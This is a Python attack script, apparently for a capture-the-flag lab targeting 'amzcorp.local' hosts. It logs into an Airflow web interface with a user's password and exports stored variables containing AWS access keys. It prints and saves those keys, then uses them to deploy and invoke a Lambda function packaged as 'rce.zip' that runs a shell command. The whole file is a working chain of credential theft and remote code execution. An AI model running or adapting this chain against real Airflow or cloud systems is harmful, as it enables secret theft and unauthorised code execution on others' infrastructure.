#!/usr/bin/env python3
"""Export Airflow variables (olivia) and create/invoke Lambda (Flag 8 chain)."""
import json
import re
import subprocess
import sys
from pathlib import Path
import os

import requests

WORKFLOW = "http://workflow.amzcorp.local"
CLOUD = "http://cloud.amzcorp.local"

OLIVIA_USER = "olivia"
OLIVIA_PASS = os.environ.get("OLIVIA_PASSWORD")
if not OLIVIA_PASS:
    raise SystemExit("Set OLIVIA_PASSWORD")


def csrf(html: str) -> str:
    m = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', html)
    if not m:
        raise RuntimeError("csrf_token not found")
    return m.group(1)


def login_workflow() -> requests.Session:
    s = requests.Session()
    r = s.get(f"{WORKFLOW}/login/")
    s.post(
        f"{WORKFLOW}/login/",
        data={"csrf_token": csrf(r.text), "username": OLIVIA_USER, "password": OLIVIA_PASS},
    )
    return s


def export_variables(s: requests.Session) -> dict:
    r = s.get(f"{WORKFLOW}/variable/list/")
    token = csrf(r.text)
    r = s.post(
        f"{WORKFLOW}/variable/action_post",
        data=[("csrf_token", token), ("action", "varexport"), ("rowid", "1"), ("rowid", "2")],
    )
    return json.loads(r.text)


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    s = login_workflow()
    vars_json = export_variables(s)
    out = root / "artifacts" / "workflow_variables.json"
    out.write_text(json.dumps(vars_json, indent=2))
    print(f"saved {out}")
    print(json.dumps(vars_json, indent=2))

    env = {
        **os.environ,
        "AWS_ACCESS_KEY_ID": vars_json["AWS_ACCESS_KEY_ID"],
        "AWS_SECRET_ACCESS_KEY": vars_json["AWS_SECRET_ACCESS_KEY"],
        "AWS_DEFAULT_REGION": "us-east-1",
    }
    scripts = root / "scripts"
    subprocess.run(["zip", "-q", "rce.zip", "rce.py"], cwd=scripts, check=True)
    subprocess.run(
        [
            "aws",
            "--endpoint-url",
            CLOUD,
            "lambda",
            "create-function",
            "--function-name",
            "pentest-id",
            "--runtime",
            "python3.8",
            "--role",
            "arn:aws:iam::000000000000:role/serviceadm",
            "--handler",
            "rce.lambda_handler",
            "--zip-file",
            "fileb://rce.zip",
        ],
        cwd=scripts,
        env=env,
        check=False,
    )
    subprocess.run(
        [
            "aws",
            "--endpoint-url",
            CLOUD,
            "lambda",
            "invoke",
            "--function-name",
            "pentest-id",
            "--payload",
            '{"cmd":"id"}',
            "/tmp/lambda_id.txt",
        ],
        env=env,
        check=False,
    )
    print(Path("/tmp/lambda_id.txt").read_text() if Path("/tmp/lambda_id.txt").exists() else "invoke output missing")


if __name__ == "__main__":
    main()
